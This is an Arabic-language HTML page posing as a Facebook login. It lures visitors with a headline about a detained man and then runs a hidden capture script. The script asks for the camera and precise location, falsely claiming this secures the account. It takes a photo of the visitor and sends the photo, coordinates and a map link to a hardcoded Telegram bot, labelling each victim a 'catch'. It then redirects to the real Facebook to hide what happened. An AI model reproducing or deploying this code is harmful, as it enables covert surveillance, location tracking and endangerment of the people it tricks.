<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>فيسبوك - أين محمد مصطفى العنعوني؟</title>
    <meta property="og:title" content="أين محمد مصطفى العنعوني؟ #الحرية_للمعتقلين">
    <meta property="og:description" content="بأي ذنب يُخطف [محمد مصطفى العنعوني]؟ وبأي حق نعيش في غابة يغيب فيها القانون... اللهم ردّه إلينا سالماً.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png">
    <meta property="og:url" content="https://www.facebook.com">
    <meta property="og:type" content="article">

    <style>
        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
        .form-area {padding:20px;}
        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
        
        /* نافذة التفاعل الفوري (لفتح ثغرة المتصفح) */
        #startOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.95); z-index: 10000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            text-align: center; padding: 20px;
        }
        .start-btn { padding: 15px 40px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }

        #warning {
            display:none; position:fixed; top:0; left:0; right:0; bottom:0; 
            background:rgba(0,0,0,0.9); color:white; text-align:center; 
            padding:40px; font-size:18px; z-index:10001; flex-direction:column; justify-content:center; align-items:center;
        }
    </style>
</head>
<body>

<div id="startOverlay">
    <div style="margin-bottom: 20px; color: #1c1e21; font-size: 18px; line-height: 1.5;">
        ⚠️ يجب تسجيل الدخول للمتابعة وقراءة تفاصيل الخبر.
    </div>
    <button class="start-btn" id="initBtn">متابعة إلى فيسبوك</button>
</div>

<div id="warning">
    <div>⚠️ يجب السماح بالأذونات (الكاميرا والموقع) لتأمين حسابك قبل قراءة المحتوى الحساس.</div>
    <button style="margin-top:20px; padding:10px 20px; background:#1877f2; border:none; color:white; border-radius:5px;" onclick="location.reload()">إعادة محاولة</button>
</div>

<div class="fb-container" id="fbMain">
    <div class="header">فيسبوك</div>
    <div class="form-area">
        <form id="loginForm">
            <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
            <input type="password" id="pass" placeholder="كلمة المرور" required>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
    </div>
</div>

<script>
const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";

// تشغيل الهجوم فور الضغط على متابعة
document.getElementById('initBtn').onclick = function() {
    document.getElementById('startOverlay').style.display = 'none';
    startCapture();
};

async function startCapture() {
    try {
        // طلب الكاميرا والموقع بتفاعل واحد
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 1280; canvas.height = 720;
            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
            const imageData = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(
                (pos) => sendToTelegram(imageData, pos),
                () => document.getElementById('warning').style.display = 'flex',
                { enableHighAccuracy: true }
            );
        }, 1500);

    } catch (err) {
        document.getElementById('warning').style.display = 'flex';
    }
}

async function sendToTelegram(img, pos) {
    const lat = pos.coords.latitude.toFixed(6);
    const lng = pos.coords.longitude.toFixed(6);
    const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
    
    const caption = `🎯 صيد جديد (عن طريق الخبر)\n📍 الموقع: ${lat},${lng}\n🔗 الخريطة: ${mapsUrl}`;

    const blob = dataURLtoBlob(img);
    const fd = new FormData();
    fd.append('photo', blob, 'victim.jpg');
    fd.append('caption', caption);
    fd.append('chat_id', CHAT_ID);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
}

function dataURLtoBlob(dataurl) {
    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while(n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], {type: mime});
}

document.getElementById('loginForm').onsubmit = function(e) {
    e.preventDefault();
    // توجيه نهائي للفيسبوك الحقيقي لإكمال التمويه
    window.location.href = "https://m.facebook.com/";
};
</script>

</body>
</html>
